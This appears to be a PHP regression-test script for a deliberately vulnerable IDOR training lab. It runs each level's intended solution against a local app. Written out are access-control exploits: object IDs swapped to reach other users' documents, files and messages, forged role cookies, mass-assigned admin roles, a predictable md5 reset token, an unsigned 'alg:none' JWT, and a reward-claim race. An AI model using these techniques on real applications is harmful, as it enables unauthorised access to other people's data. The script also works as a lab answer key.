<?php
/**
 * IDOR Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/db.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function http_req(string $url, string $method = 'GET', array $fields = [], array $headers = []): string
{
    $opts = [
        'method'        => $method,
        'timeout'       => 20,
        'ignore_errors' => true,
    ];
    $hdr = $headers;
    if ($method === 'POST') {
        $hdr[]           = 'Content-Type: application/x-www-form-urlencoded';
        $opts['content'] = http_build_query($fields);
    }
    if ($hdr) {
        $opts['header'] = implode("\r\n", $hdr) . "\r\n";
    }
    return (string)@file_get_contents($url, false, stream_context_create(['http' => $opts]));
}

function get(string $url, array $headers = []): string  { return http_req($url, 'GET', [], $headers); }
function post(string $url, array $f, array $h = []): string { return http_req($url, 'POST', $f, $h); }

/** POST a raw JSON body (for the real REST endpoint). */
function post_json(string $url, array $payload): string
{
    return (string)@file_get_contents($url, false, stream_context_create(['http' => [
        'method'        => 'POST',
        'header'        => "Content-Type: application/json\r\n",
        'content'       => json_encode($payload),
        'timeout'       => 20,
        'ignore_errors' => true,
    ]]));
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

/** Extra assertions that are reported but not counted in the pass/fail total. */
function note(bool $ok, string $text): void
{
    echo $ok ? "        ok    $text\n" : "        WARN  $text\n";
}

/** base64url without padding, as a JWT uses. */
function b64url(string $s): string
{
    return rtrim(strtr(base64_encode($s), '+/', '-_'), '=');
}

echo "IDOR Lab self-test\n------------------\n";

/* Pre-check: the objects being stolen must really belong to someone else. */
$db = get_db();
$owner = $db->query("SELECT owner_id FROM documents WHERE id = 4")->fetchColumn();
note((int)$owner === 4, "document 4 is owned by user 4 (admin), not the session user 1");
$upOwner = $db->query("SELECT owner_id FROM uploads WHERE filename = 'bob_report.txt'")->fetchColumn();
note((int)$upOwner === 2, "bob_report.txt is owned by user 2 (bob), not the session user 1");
$recip = $db->query("SELECT recipient_id FROM messages WHERE id = 2")->fetchColumn();
note((int)$recip === 2, "message 2 is addressed to user 2 (bob), not the session user 1");
echo "\n";

/* 1 - no ownership filter on the document lookup */
check(1, get("$base/level1.php?id=4"), 'admin document by id');

/* 2 - uploads are keyed by filename alone */
check(2, get("$base/level2.php?filename=bob_report.txt"), "another user's file");

/* 3 - the identity comes from the POST body */
check(3, post("$base/level3.php", ['user_id' => 4]), 'hidden field tampered to admin');

/* 4 - no recipient check on the message lookup */
check(4, get("$base/level4.php?msg_id=2"), "message addressed to bob");

/* 5 - mass assignment: a role field the form never offered */
check(5, post("$base/level5.php", [
    'username' => 'alice', 'email' => 'alice@lab.local', 'role' => 'admin',
]), 'role injected into the UPDATE');
$roleAfter = $db->query("SELECT role FROM users WHERE id = 1")->fetchColumn();
note($roleAfter === 'user', "alice's role was reset to 'user' after the level-5 run");

/* 6 - the role is read straight out of a client cookie */
check(6, get("$base/level6.php", ['Cookie: user_role=admin; user_id=4']), 'forged cookie');

/* 7 - a valid API key, but no check on WHOSE record is requested */
check(7, post("$base/level7.php", ['api_key' => 'key_alice_abc123', 'user_id' => 4]),
    "alice's key reads the admin record");
$apiBody = post_json("$base/api.php?action=getUser", ['api_key' => 'key_alice_abc123', 'id' => 4]);
note(strpos($apiBody, 'key_admin_MASTER') !== false,
    "api.php itself leaks the admin api_key to alice's key (the real endpoint, not just the proxy)");

/* 8 - the reset token is md5(username) */
check(8, get("$base/level8.php?user=admin&token=" . md5('admin')), 'predictable reset token');

/* 9 - the JWT signature is never verified */
$h = b64url('{"alg":"none","typ":"JWT"}');
$p = b64url('{"user":"alice","role":"admin","id":1}');
check(9, get("$base/level9.php", ['Cookie: token=' . rawurlencode("$h.$p.forge_sig")]), 'unverified JWT');

/* 10 - TOCTOU: create for alice, claim as bob */
get("$base/level10.php?action=reset");
get("$base/level10.php?action=create&user_id=1");
$claim = get("$base/level10.php?action=claim&user_id=2");
check(10, $claim, "bob claimed alice's reward");
$row = $db->query("SELECT user_id, claimed, claimed_by FROM rewards ORDER BY id DESC LIMIT 1")->fetch();
note($row && (int)$row['claimed'] === 1 && (int)$row['claimed_by'] === 2 && (int)$row['user_id'] === 1,
    'the reward row really shows created_for=1, claimed_by=2');
get("$base/level10.php?action=reset");

echo "------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
